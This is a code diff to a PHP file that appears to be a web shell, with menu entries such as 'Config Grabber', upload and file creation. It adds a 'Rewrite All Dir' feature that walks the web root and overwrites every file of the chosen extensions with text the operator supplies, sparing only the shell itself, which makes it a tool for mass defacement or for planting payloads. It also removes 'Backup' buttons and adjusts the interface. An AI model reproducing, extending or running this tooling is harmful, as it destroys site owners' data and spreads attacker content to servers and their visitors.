@@ -201,6 +201,46 @@ class XN {
             }
         }
     }
+    public static function listFile($dir, &$output = array()) {
+    	foreach (scandir($dir) as $key => $value) {
+			$location = $dir.DIRECTORY_SEPARATOR.$value;
+			if (!is_dir($location)) {
+				$output[] = $location;
+			} elseif ($value != "." && $value != '..') {
+				self::listFile($location, $output);
+				$output[] = $location;
+			}
+		} return $output;
+	}
+	public static function rewrite($dir, $extension, $text) {
+		if (is_writable($dir)) {
+			foreach (self::listFile($dir) as $key => $value) {
+				switch (self::getext($value)) {
+					case $extension:
+						if (preg_match('/'.basename($value)."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
+							if (file_put_contents($value, $text)) {
+								?>
+								<div class="rewrite-success">
+									<?= $value ?>
+									<span>Success</span>
+								</div>
+								<?php
+							} else {
+								if (is_readable($value)) {
+								?>
+								<div class="rewrite-failed">
+									<?= $value ?>
+									<span>Failed</span>
+								</div>
+								<?php
+							}
+						}
+					}
+					break;
+				}
+			}
+		}
+	}
     public static function formatSize( $bytes ){
         $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
         for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
@@ -264,6 +304,18 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
+                        <div class="icon">
+                            <a><i class="fas fa-info-circle"></i></a>
+                        </div>
+                        <div class="font">
+                            Server Info
+                        </div>
+                    </button>
+                </li>
+                <li>
                     <button name="action" value="upload">
                         <div class="icon">
                             <a><i class="fa fa-upload" aria-hidden="true"></i></a>
@@ -274,9 +326,7 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
-                    })">
+                    <button name="action" value="addfile">
                         <div class="icon">
                             <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
                         </div>
@@ -306,6 +356,16 @@ function head($x, $y, $class = null) {
                         </div>
                         <div class="font">
                             Config Grabber
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button name="action" value="rewrite">
+                        <div class="icon">
+                            <a><i class="fas fa-exclamation-triangle"></i></a>
+                        </div>
+                        <div class="font">
+                            Rewrite All Dir
                         </div>
                     </button>
                 </li>
@@ -433,6 +493,31 @@ function alert($message) {
         height:390px;
 
     }
+    .rewrite-success {
+    	background: #6dc900;
+    	padding:5px;
+    	color: #fff;
+    	border-radius: 7px;
+    	margin-bottom:5px;
+    }
+    .rewrite-failed {
+    	background: #c90606;
+    	padding:5px;
+    	color: #fff;
+    	border-radius: 7px;
+    	margin-bottom:5px;
+    }
+    .rewrite-success span {
+    	float: right;
+    }
+    .rewrite-failed span {
+    	float: right;
+    }
+    .rewrite {
+    	height:555px;
+    	overflow: auto;
+    }
+    .rewrite,
     .addfile,
     .upload,
     .rename,
@@ -440,6 +525,7 @@ function alert($message) {
         padding-left: 25px;
         padding-right: 25px;
     }
+    .rewrite table td,
     .addfile table td,
     .upload table td,
     .rename table td,
@@ -459,6 +545,7 @@ function alert($message) {
         padding-left:10px;
         padding-right: 10px;
     }
+    .rewrite input[type=submit],
     .addfile input[type=submit],
     .upload input[type=submit],
     .rename input[type=submit],
@@ -895,6 +982,56 @@ function filterTable() {
                 alert("Permission Danied");
             }
             break;
+        case 'rewrite':
+        head('Rewrite All Dir', getcwd(), 'hidden');
+        	?>
+        	<div class="rewrite">
+        		<table>
+        			<form method="post">
+        				<tr>
+        					<td>
+        						<input type="text" name="dir" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>">
+        					</td>
+        				</tr>
+        				<tr>
+							<td>
+								<input type="text" name="ext[]" placeholder="ext: php html txt">
+							</td>
+						</tr>
+						<tr>
+							<td>
+								<textarea name="text"></textarea>
+							</td>
+						</tr>
+						<tr>
+							<td>
+								<input type="submit" name="rewrite" value="Start">
+								<input type="hidden" name="action" value="rewrite">
+							</td>
+						</tr>
+        			</form>
+        		</table>
+        		<?php
+        		if (isset($_POST['rewrite'])) {
+        			for ($i=0; $i < count($_POST['ext']) ; $i++) { 
+					$plod = explode(" ", $_POST['ext'][$i]);
+					foreach ($plod as $data) {
+						if ($data) { ?>
+							<tr>
+								<td>
+									<b><?= $data ?></b>
+								</td>
+							</tr>
+							<?php XN::rewrite($_POST['dir'], $data, $_POST['text']);
+							}
+						}
+					}
+				}
+				?>
+				</div>
+				<?php
+        	exit();
+        	break;
         case 'addfile':
             if (isset($_POST['addfile'])) {
                 XN::addfile($_POST['filename'], $_POST['data']);
@@ -908,20 +1045,20 @@ function filterTable() {
                             <td>
                                 <input type="text" name="filename[]">
                             </td>
-                            <td><a id="add_input">add</a></td>
+                            <td style="display: none;"><a id="add_input">add</a></td>
                         </tr>
                         <tr>
-                            <td colspan="2">
+                            <td style="display: none;">
                                 <div id="output"></div>
                             </td>
                         </tr>
                         <tr>
-                            <td colspan="2">
+                            <td>
                                 <textarea name="data"></textarea>
                             </td>
                         </tr>
                         <tr>
-                            <td colspan="2">
+                            <td>
                                 <input type="submit" name="addfile">
                                 <input type="hidden" name="action" value="addfile">
                             </td>
@@ -1249,9 +1386,6 @@ function filterTable() {
                                         <li>
                                             <button name="action" value="rename">Rename</button>
                                         </li>
-                                        <li>
-                                            <button name="action" value="backup">Backup</button>
-                                        </li>
                                         <?php
                                         break;
                                     case 'zip':
@@ -1284,9 +1418,6 @@ function filterTable() {
                                         </li>
                                         <li>
                                             <button name="action" value="rename">Rename</button>
-                                        </li>
-                                        <li>
-                                            <button name="action" value="backup">Backup</button>
                                         </li>
                                         <?php
                                         break;
